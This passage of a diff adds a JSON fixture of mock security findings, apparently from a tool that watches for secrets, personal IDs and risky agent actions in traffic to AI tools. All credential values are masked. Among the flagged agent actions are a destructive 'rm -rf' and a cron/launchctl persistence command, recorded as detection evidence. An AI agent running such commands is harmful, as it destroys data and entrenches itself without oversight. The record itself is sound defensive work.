+      "triage": null
+    },
+    {
+      "id": "fnd_0027",
+      "ts": "2026-10-30T01:36:01Z",
+      "event_id": "evt_0077",
+      "type": "pii",
+      "subtype": "gstin",
+      "severity": "medium",
+      "confidence": 0.99,
+      "title": "GSTIN",
+      "description": "GSTIN seen in ChatGPT traffic to ChatGPT.",
+      "evidence": {
+        "redacted_snippet": "gstin: 29FA•••••••••Z5",
+        "match_redacted": "29FA•••••••••Z5",
+        "entropy": null,
+        "line": 28,
+        "offset": 256,
+        "fingerprint": "ed9f194a1dea"
+      },
+      "detector": "regex",
+      "provider_id": "chatgpt",
+      "process_name": "ChatGPT",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0038",
+      "ts": "2026-10-30T00:04:47Z",
+      "event_id": "evt_0088",
+      "type": "agent_action",
+      "subtype": "destructive_command",
+      "severity": "critical",
+      "confidence": 0.91,
+      "title": "Agent ran a destructive command",
+      "description": "Agent ran a destructive command seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "rm -rf ./build /tmp/workspace",
+        "match_redacted": "rm -rf ./build /tmp/workspace",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "f42eeeedb606"
+      },
+      "detector": "heuristic",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0055",
+      "ts": "2026-10-29T21:59:31Z",
+      "event_id": "evt_0100",
+      "type": "pii",
+      "subtype": "pan",
+      "severity": "high",
+      "confidence": 0.98,
+      "title": "PAN number",
+      "description": "PAN number seen in aider traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "pan: FAKP••••4E",
+        "match_redacted": "FAKP••••4E",
+        "entropy": null,
+        "line": 11,
+        "offset": 1193,
+        "fingerprint": "0375360885f6"
+      },
+      "detector": "regex",
+      "provider_id": "openai",
+      "process_name": "aider",
+      "status": "resolved",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Notify DPO under DPDP Act 2023",
+        "Enable masking in source system"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0007",
+      "ts": "2026-10-29T21:33:47Z",
+      "event_id": "evt_0102",
+      "type": "secret",
+      "subtype": "slack_token",
+      "severity": "high",
+      "confidence": 0.75,
+      "title": "Slack bot token exposed",
+      "description": "Slack bot token exposed seen in ollama traffic to Ollama (local).",
+      "evidence": {
+        "redacted_snippet": "SLACK_BOT_TOKEN=xoxb•••••••••••••••••••••••FA",
+        "match_redacted": "xoxb•••••••••••••••••••••••FA",
+        "entropy": 3.35,
+        "line": 71,
+        "offset": 662,
+        "fingerprint": "f5f6e3e0b10d"
+      },
+      "detector": "regex",
+      "provider_id": "ollama",
+      "process_name": "ollama",
+      "status": "acknowledged",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0005",
+      "ts": "2026-10-29T21:11:52Z",
+      "event_id": "evt_0104",
+      "type": "secret",
+      "subtype": "github_token",
+      "severity": "critical",
+      "confidence": 0.93,
+      "title": "GitHub token exposed",
+      "description": "GitHub token exposed seen in Windsurf traffic to Codeium / Windsurf.",
+      "evidence": {
+        "redacted_snippet": "Authorization: token ghp_••••••••••••••••••••••••••••••••••AK",
+        "match_redacted": "ghp_••••••••••••••••••••••••••••••••••AK",
+        "entropy": 3.24,
+        "line": 8,
+        "offset": 383,
+        "fingerprint": "2e96817198e1"
+      },
+      "detector": "regex",
+      "provider_id": "codeium",
+      "process_name": "Windsurf",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": {
+        "verdict": "true_positive",
+        "sensitivity": "critical",
+        "reasoning": "Rules match for github_token with a valid format and no test-data marker in context.",
+        "remediation_steps": [
+          "Revoke and rotate the credential",
+          "Move it to a secrets manager",
+          "Add pre-commit secret scanning"
+        ],
+        "policy_suggestion": "Route this tool through the Local Gateway with block_on_critical enabled.",
+        "engine": "rules",
+        "model": "rules-v1",
+        "latency_ms": 7,
+        "redacted_input_preview": "Authorization: token ghp_••••••••••••••••••••••••••••••••••AK"
+      }
+    },
+    {
+      "id": "fnd_0053",
+      "ts": "2026-10-29T21:00:03Z",
+      "event_id": "evt_0105",
+      "type": "agent_action",
+      "subtype": "unverified_tool_call",
+      "severity": "medium",
+      "confidence": 0.81,
+      "title": "Unverified dangerous tool call",
+      "description": "Unverified dangerous tool call seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "tool shell called with no human confirmation",
+        "match_redacted": "tool shell called with no human confirmation",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "7dcae9bee488"
+      },
+      "detector": "heuristic",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0016",
+      "ts": "2026-10-29T20:48:29Z",
+      "event_id": "evt_0107",
+      "type": "secret",
+      "subtype": "db_connection_url",
+      "severity": "critical",
+      "confidence": 0.75,
+      "title": "Database URL with credentials",
+      "description": "Database URL with credentials seen in Cursor Helper traffic to Cursor.",
+      "evidence": {
+        "redacted_snippet": "DATABASE_URL=post•••••••••••••••••••••••••••••••••••••••••••••••••••••••od",
+        "match_redacted": "post•••••••••••••••••••••••••••••••••••••••••••••••••••••••od",
+        "entropy": 4.59,
+        "line": 67,
+        "offset": 163,
+        "fingerprint": "1c8a65b9c4ee"
+      },
+      "detector": "regex",
+      "provider_id": "cursor",
+      "process_name": "Cursor Helper",
+      "status": "false_positive",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0032",
+      "ts": "2026-10-29T20:48:29Z",
+      "event_id": "evt_0107",
+      "type": "pii",
+      "subtype": "us_ssn",
+      "severity": "high",
+      "confidence": 0.99,
+      "title": "US social security number",
+      "description": "US social security number seen in Cursor Helper traffic to Cursor.",
+      "evidence": {
+        "redacted_snippet": "ssn: 219-•••••99",
+        "match_redacted": "219-•••••99",
+        "entropy": null,
+        "line": 20,
+        "offset": 1095,
+        "fingerprint": "cefcfd691dce"
+      },
+      "detector": "regex",
+      "provider_id": "cursor",
+      "process_name": "Cursor Helper",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0004",
+      "ts": "2026-10-29T20:44:26Z",
+      "event_id": "evt_0108",
+      "type": "secret",
+      "subtype": "anthropic_key",
+      "severity": "critical",
+      "confidence": 0.8,
+      "title": "Anthropic API key exposed",
+      "description": "Anthropic API key exposed seen in ChatGPT traffic to ChatGPT.",
+      "evidence": {
+        "redacted_snippet": "ANTHROPIC_API_KEY=sk-a•••••••••••••••••••••••••••••••••PL",
+        "match_redacted": "sk-a•••••••••••••••••••••••••••••••••PL",
+        "entropy": 3.49,
+        "line": 27,
+        "offset": 1444,
+        "fingerprint": "626374c2bb85"
+      },
+      "detector": "regex",
+      "provider_id": "chatgpt",
+      "process_name": "ChatGPT",
+      "status": "false_positive",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": {
+        "verdict": "true_positive",
+        "sensitivity": "critical",
+        "reasoning": "Rules match for anthropic_key with a valid format and no test-data marker in context.",
+        "remediation_steps": [
+          "Revoke and rotate the credential",
+          "Move it to a secrets manager",
+          "Add pre-commit secret scanning"
+        ],
+        "policy_suggestion": "Route this tool through the Local Gateway with block_on_critical enabled.",
+        "engine": "rules",
+        "model": "rules-v1",
+        "latency_ms": 2,
+        "redacted_input_preview": "ANTHROPIC_API_KEY=sk-a•••••••••••••••••••••••••••••••••PL"
+      }
+    },
+    {
+      "id": "fnd_0010",
+      "ts": "2026-10-29T19:47:00Z",
+      "event_id": "evt_0112",
+      "type": "secret",
+      "subtype": "hf_token",
+      "severity": "high",
+      "confidence": 0.76,
+      "title": "Hugging Face token exposed",
+      "description": "Hugging Face token exposed seen in ollama traffic to Ollama (local).",
+      "evidence": {
+        "redacted_snippet": "HF_TOKEN=hf_F•••••••••••••••••••••••••••••••EF",
+        "match_redacted": "hf_F•••••••••••••••••••••••••••••••EF",
+        "entropy": 3.16,
+        "line": 45,
+        "offset": 400,
+        "fingerprint": "8474000c52b7"
+      },
+      "detector": "regex",
+      "provider_id": "ollama",
+      "process_name": "ollama",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0025",
+      "ts": "2026-10-29T19:45:09Z",
+      "event_id": "evt_0113",
+      "type": "pii",
+      "subtype": "aadhaar",
+      "severity": "high",
+      "confidence": 0.92,
+      "title": "Aadhaar number (Verhoeff valid)",
+      "description": "Aadhaar number (Verhoeff valid) seen in python3 traffic to ShadowScope Mock Provider.",
+      "evidence": {
+        "redacted_snippet": "aadhaar_no: XXXX XXXX 0124",
+        "match_redacted": "XXXX XXXX 0124",
+        "entropy": null,
+        "line": 10,
+        "offset": 311,
+        "fingerprint": "f2b5f4c18010"
+      },
+      "detector": "validator",
+      "provider_id": "mock_ai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Notify DPO under DPDP Act 2023",
+        "Enable masking in source system"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0017",
+      "ts": "2026-10-29T19:34:31Z",
+      "event_id": "evt_0115",
+      "type": "secret",
+      "subtype": "azure_conn_string",
+      "severity": "critical",
+      "confidence": 0.93,
+      "title": "Azure storage connection string",
+      "description": "Azure storage connection string seen in Cursor Helper traffic to Cursor.",
+      "evidence": {
+        "redacted_snippet": "Defa••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••LE",
+        "match_redacted": "Defa••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••LE",
+        "entropy": 4.58,
+        "line": 17,
+        "offset": 413,
+        "fingerprint": "4724b5299b53"
+      },
+      "detector": "regex",
+      "provider_id": "cursor",
+      "process_name": "Cursor Helper",
+      "status": "acknowledged",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0012",
+      "ts": "2026-10-29T18:52:53Z",
+      "event_id": "evt_0119",
+      "type": "secret",
+      "subtype": "npm_token",
+      "severity": "high",
+      "confidence": 0.84,
+      "title": "npm token exposed",
+      "description": "npm token exposed seen in Cursor Helper traffic to Cursor.",
+      "evidence": {
+        "redacted_snippet": "//registry.npmjs.org/:_authToken=npm_••••••••••••••••••••••••••••••••••AK",
+        "match_redacted": "npm_••••••••••••••••••••••••••••••••••AK",
+        "entropy": 3.24,
+        "line": 22,
+        "offset": 1555,
+        "fingerprint": "e713e20c498f"
+      },
+      "detector": "regex",
+      "provider_id": "cursor",
+      "process_name": "Cursor Helper",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0033",
+      "ts": "2026-10-29T18:22:42Z",
+      "event_id": "evt_0122",
+      "type": "pii",
+      "subtype": "private_ip",
+      "severity": "low",
+      "confidence": 0.98,
+      "title": "Internal IP address",
+      "description": "Internal IP address seen in Windsurf traffic to Codeium / Windsurf.",
+      "evidence": {
+        "redacted_snippet": "db host 10.2••••44",
+        "match_redacted": "10.2••••44",
+        "entropy": null,
+        "line": 15,
+        "offset": 752,
+        "fingerprint": "cf34951f0832"
+      },
+      "detector": "regex",
+      "provider_id": "codeium",
+      "process_name": "Windsurf",
+      "status": "open",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0028",
+      "ts": "2026-10-29T18:14:19Z",
+      "event_id": "evt_0123",
+      "type": "pii",
+      "subtype": "upi_id",
+      "severity": "medium",
+      "confidence": 0.79,
+      "title": "UPI ID",
+      "description": "UPI ID seen in Microsoft Edge traffic to Perplexity.",
+      "evidence": {
+        "redacted_snippet": "upi: fake••••••••••is",
+        "match_redacted": "fake••••••••••is",
+        "entropy": null,
+        "line": 74,
+        "offset": 2303,
+        "fingerprint": "ffad2a367429"
+      },
+      "detector": "regex",
+      "provider_id": "perplexity",
+      "process_name": "Microsoft Edge",
+      "status": "acknowledged",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0001",
+      "ts": "2026-10-29T16:23:58Z",
+      "event_id": "evt_0130",
+      "type": "secret",
+      "subtype": "aws_access_key",
+      "severity": "critical",
+      "confidence": 0.75,
+      "title": "AWS access key in AI prompt",
+      "description": "AWS access key in AI prompt seen in aider traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "AWS_ACCESS_KEY_ID=AKIA••••••••••••••EE",
+        "match_redacted": "AKIA••••••••••••••EE",
+        "entropy": 2.82,
+        "line": 2,
+        "offset": 1947,
+        "fingerprint": "b91f1bfba25a"
+      },
+      "detector": "regex",
+      "provider_id": "openai",
+      "process_name": "aider",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Deactivate key in IAM now",
+        "Rotate & move to AWS Secrets Manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": {
+        "verdict": "true_positive",
+        "sensitivity": "critical",
+        "reasoning": "Rules match for aws_access_key with a valid format and no test-data marker in context.",
+        "remediation_steps": [
+          "Deactivate key in IAM now",
+          "Rotate & move to AWS Secrets Manager",
+          "Add pre-commit secret scanning"
+        ],
+        "policy_suggestion": "Route this tool through the Local Gateway with block_on_critical enabled.",
+        "engine": "rules",
+        "model": "rules-v1",
+        "latency_ms": 12,
+        "redacted_input_preview": "AWS_ACCESS_KEY_ID=AKIA••••••••••••••EE"
+      }
+    },
+    {
+      "id": "fnd_0036",
+      "ts": "2026-10-29T16:23:58Z",
+      "event_id": "evt_0130",
+      "type": "source_code",
+      "subtype": "proprietary_code",
+      "severity": "high",
+      "confidence": 0.85,
+      "title": "Proprietary code sent to AI tool",
+      "description": "Proprietary code sent to AI tool seen in aider traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "# CONF•••••••••••••••••••••••••••••••••••••••••ly",
+        "match_redacted": "CONF•••••••••••••••••••••••••••••••••••••••••ly",
+        "entropy": null,
+        "line": 57,
+        "offset": 140,
+        "fingerprint": "e275e67d94f7"
+      },
+      "detector": "heuristic",
+      "provider_id": "openai",
+      "process_name": "aider",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Review what was shared with the provider",
+        "Move the team to a sanctioned AI tool"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0002",
+      "ts": "2026-10-29T15:21:14Z",
+      "event_id": "evt_0134",
+      "type": "secret",
+      "subtype": "aws_secret_key",
+      "severity": "critical",
+      "confidence": 0.97,
+      "title": "AWS secret key in AI prompt",
+      "description": "AWS secret key in AI prompt seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "aws_••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••A\"",
+        "match_redacted": "aws_••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••A\"",
+        "entropy": 4.05,
+        "line": 53,
+        "offset": 234,
+        "fingerprint": "90c566b36706"
+      },
+      "detector": "regex",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "acknowledged",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": {
+        "verdict": "true_positive",
+        "sensitivity": "critical",
+        "reasoning": "Rules match for aws_secret_key with a valid format and no test-data marker in context.",
+        "remediation_steps": [
+          "Revoke and rotate the credential",
+          "Move it to a secrets manager",
+          "Add pre-commit secret scanning"
+        ],
+        "policy_suggestion": "Route this tool through the Local Gateway with block_on_critical enabled.",
+        "engine": "rules",
+        "model": "rules-v1",
+        "latency_ms": 6,
+        "redacted_input_preview": "aws_••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••A\""
+      }
+    },
+    {
+      "id": "fnd_0003",
+      "ts": "2026-10-29T15:21:14Z",
+      "event_id": "evt_0134",
+      "type": "secret",
+      "subtype": "openai_key",
+      "severity": "critical",
+      "confidence": 0.74,
+      "title": "OpenAI API key exposed",
+      "description": "OpenAI API key exposed seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "OPENAI_API_KEY=sk-p••••••••••••••••••••••••••••••••••PL",
+        "match_redacted": "sk-p••••••••••••••••••••••••••••••••••PL",
+        "entropy": 3.57,
+        "line": 42,
+        "offset": 1948,
+        "fingerprint": "b9a636256907"
+      },
+      "detector": "regex",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "acknowledged",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": {
+        "verdict": "true_positive",
+        "sensitivity": "critical",
+        "reasoning": "Rules match for openai_key with a valid format and no test-data marker in context.",
+        "remediation_steps": [
+          "Revoke and rotate the credential",
+          "Move it to a secrets manager",
+          "Add pre-commit secret scanning"
+        ],
+        "policy_suggestion": "Route this tool through the Local Gateway with block_on_critical enabled.",
+        "engine": "rules",
+        "model": "rules-v1",
+        "latency_ms": 3,
+        "redacted_input_preview": "OPENAI_API_KEY=sk-p••••••••••••••••••••••••••••••••••PL"
+      }
+    },
+    {
+      "id": "fnd_0042",
+      "ts": "2026-10-29T14:08:48Z",
+      "event_id": "evt_0138",
+      "type": "agent_action",
+      "subtype": "persistence",
+      "severity": "high",
+      "confidence": 0.76,
+      "title": "Agent attempted persistence",
+      "description": "Agent attempted persistence seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "crontab -l; launchctl load agent.plist",
+        "match_redacted": "crontab -l; launchctl load agent.plist",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "ee02146a9428"
+      },
+      "detector": "heuristic",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0009",
+      "ts": "2026-10-29T14:02:52Z",
+      "event_id": "evt_0140",
+      "type": "secret",
+      "subtype": "stripe_key",
+      "severity": "medium",
+      "confidence": 0.75,
+      "title": "Test Stripe key exposed",
+      "description": "Test Stripe key exposed seen in Code Helper (Plugin) traffic to GitHub Copilot.",
+      "evidence": {
+        "redacted_snippet": "stripe.api_key = 'sk_t••••••••••••••••••••••••••FA'",
+        "match_redacted": "sk_t••••••••••••••••••••••••••FA",
+        "entropy": 3.5,
+        "line": 63,
+        "offset": 1135,
+        "fingerprint": "8bf44b76e6ce"
+      },
+      "detector": "regex",
+      "provider_id": "copilot",
+      "process_name": "Code Helper (Plugin)",
+      "status": "resolved",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0022",
+      "ts": "2026-10-29T14:02:52Z",
+      "event_id": "evt_0140",
+      "type": "pii",
+      "subtype": "bulk_pii",
+      "severity": "high",
+      "confidence": 0.89,
+      "title": "Bulk customer PII in one payload",
+      "description": "Bulk customer PII in one payload seen in Code Helper (Plugin) traffic to GitHub Copilot.",
+      "evidence": {
+        "redacted_snippet": "20 customer rows, first: f•••@e•••.com",
+        "match_redacted": "f•••@e•••.com",
+        "entropy": null,
+        "line": 10,
+        "offset": 1344,
+        "fingerprint": "8f0548060b7c"
+      },
+      "detector": "heuristic",
+      "provider_id": "copilot",
+      "process_name": "Code Helper (Plugin)",
+      "status": "acknowledged",
+      "compliance": [
+        "DPDP",
+        "GDPR",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Purge from AI provider history",
+        "Review the data-sharing policy with the user"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0035",
+      "ts": "2026-10-29T14:02:40Z",
+      "event_id": "evt_0141",
+      "type": "source_code",
+      "subtype": "source_code",
+      "severity": "medium",
+      "confidence": 0.99,
+      "title": "Source code sent to AI tool",
+      "description": "Source code sent to AI tool seen in LM Studio traffic to LM Studio.",
+      "evidence": {
+        "redacted_snippet": "def •••••••••••••••••••••••••••••):",
+        "match_redacted": "def •••••••••••••••••••••••••••••):",
+        "entropy": null,
+        "line": 28,
+        "offset": 763,
+        "fingerprint": "56398e682861"
+      },
+      "detector": "heuristic",
+      "provider_id": "lmstudio",
+      "process_name": "LM Studio",
+      "status": "false_positive",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Review what was shared with the provider",
+        "Move the team to a sanctioned AI tool"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0045",
+      "ts": "2026-10-29T13:18:10Z",
+      "event_id": "evt_0146",
+      "type": "agent_action",
+      "subtype": "unverified_tool_call",
+      "severity": "medium",
+      "confidence": 0.86,
+      "title": "Unverified dangerous tool call",
+      "description": "Unverified dangerous tool call seen in python3 traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "tool shell called with no human confirmation",
+        "match_redacted": "tool shell called with no human confirmation",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "7dcae9bee488"
+      },
+      "detector": "heuristic",
+      "provider_id": "openai",
+      "process_name": "python3",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Run agent in sandbox/container",
+        "Require human approval for shell tools",
+        "Restrict tool allowlist"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0049",
+      "ts": "2026-10-29T12:58:25Z",
+      "event_id": "evt_0148",
+      "type": "shadow_ai",
+      "subtype": "new_unsanctioned_tool",
+      "severity": "medium",
+      "confidence": 0.82,
+      "title": "New unsanctioned local AI tool",
+      "description": "New unsanctioned local AI tool seen in LM Studio traffic to LM Studio.",
+      "evidence": {
+        "redacted_snippet": "first contact with an unsanctioned local LLM",
+        "match_redacted": "first contact with an unsanctioned local LLM",
+        "entropy": null,
+        "line": null,
+        "offset": null,
+        "fingerprint": "29fc10236392"
+      },
+      "detector": "process",
+      "provider_id": "lmstudio",
+      "process_name": "LM Studio",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Decide whether to sanction or block this tool",
+        "Tell the owner about the approved alternative"
+      ],
+      "triage": null
+    },
+    {
+      "id": "fnd_0008",
+      "ts": "2026-10-29T12:35:04Z",
+      "event_id": "evt_0150",
+      "type": "secret",
+      "subtype": "stripe_key",
+      "severity": "critical",
+      "confidence": 0.88,
+      "title": "Live Stripe key exposed",
+      "description": "Live Stripe key exposed seen in Cursor Helper traffic to OpenAI API.",
+      "evidence": {
+        "redacted_snippet": "stripe.api_key = 'sk_l••••••••••••••••••••••••••FA'",
+        "match_redacted": "sk_l••••••••••••••••••••••••••FA",
+        "entropy": 3.63,
+        "line": 1,
+        "offset": 1965,
+        "fingerprint": "6c7e4ae282fe"
+      },
+      "detector": "regex",
+      "provider_id": "openai",
+      "process_name": "Cursor Helper",
+      "status": "open",
+      "compliance": [
+        "SOC2",
+        "ISO27001"
+      ],
+      "remediation": [
+        "Revoke and rotate the credential",
+        "Move it to a secrets manager",
+        "Add pre-commit secret scanning"
+      ],
+      "triage": null
+    }
+  ],
+  "next_cursor": null
+}
